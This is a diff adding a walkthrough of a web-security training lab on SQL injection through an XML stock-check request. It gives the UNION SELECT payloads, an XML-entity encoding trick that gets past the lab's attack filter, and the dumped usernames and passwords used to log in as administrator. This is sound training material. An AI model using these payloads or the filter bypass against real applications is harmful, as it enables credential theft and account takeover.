@@ -1,0 +1,47 @@
+Lab #3 - SQL injection with filter bypass via XML encoding
+
+Vulnerability - This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+
+Goal - he database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.
+
+Solution:
+1. When clicking to check stock => see an XML format:
+<?xml version="1.0" encoding="UTF-8"?>
+    <stockCheck>
+        <productId>1</productId>
+        <storeId>1</storeId>
+    </stockCheck>
+
+2. See that when we change storeId:
+<?xml version="1.0" encoding="UTF-8"?>
+    <stockCheck>
+        <productId>1</productId>
+        <storeId>1 + 1</storeId>
+    </stockCheck>
+
+=> the ressponse is different from previous response
+
+3. Using UNION attacks to find how many columns data has:
+<?xml version="1.0" encoding="UTF-8"?>
+    <stockCheck>
+        <productId>1</productId>
+        <storeId>1 UNION SELECT NULL FROM users --</storeId>
+    </stockCheck>
+=> response: attack detected
+=> try to encode using Hackverto:
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId><@dec_entities>1 UNION SELECT null FROM users</@dec_entities></storeId></stockCheck>
+=> SUCCESSFULLY:
+null
+178 units
+
+=> response returned has only one column
+
+4. Retrieve username and password from users table
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId><@dec_entities>1 UNION SELECT username || '~~'  || password FROM users</@dec_entities></storeId></stockCheck>
+=> response: 
+178 units
+administrator~~an2288sr16r07zkvowdt
+carlos~~ou5k31diq944e8z8uz3q
+wiener~~yfjv4u3dz5k6yy6koh41
+
+=> log in with credentials administrator:an2288sr16r07zkvowdt
